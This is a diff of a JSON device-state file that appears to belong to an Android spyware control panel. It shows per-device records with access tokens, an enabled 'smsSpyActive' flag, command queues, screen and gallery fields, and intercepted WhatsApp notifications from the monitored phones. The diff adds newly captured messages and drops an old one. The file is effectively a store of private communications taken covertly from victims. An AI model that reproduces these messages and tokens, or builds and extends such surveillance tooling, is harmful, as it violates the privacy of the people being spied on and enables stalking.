@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781881460,
+    "lastSeen": 1776781887508,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2957 pesan dari 19 chat",
+        "time": "21/04 21:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781883907
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (1031 pesan): ~ ZI ANJAYY",
@@ -10320,14 +10328,6 @@
         "time": "21/04 21:01",
         "pkg": "com.whatsapp",
         "receivedAt": 1776780088700
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (135 pesan): ~ Yolla",
-        "content": "📷 STOK PRIBADI NI\nSG RAME MAX 3 TW 4 VAULT JIBUN \nLOG BIND \nOP 750 PAS LAKU",
-        "time": "21/04 21:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780088588
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781882212,
+    "lastSeen": 1776781888775,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781882948,
+    "lastSeen": 1776781888791,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Menghapus obrolan terpilih…",
+        "content": "100%",
+        "time": "21/04 21:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781889808
+      },
       {
         "appName": "WhatsApp",
         "sender": "Menghapus obrolan terpilih…",
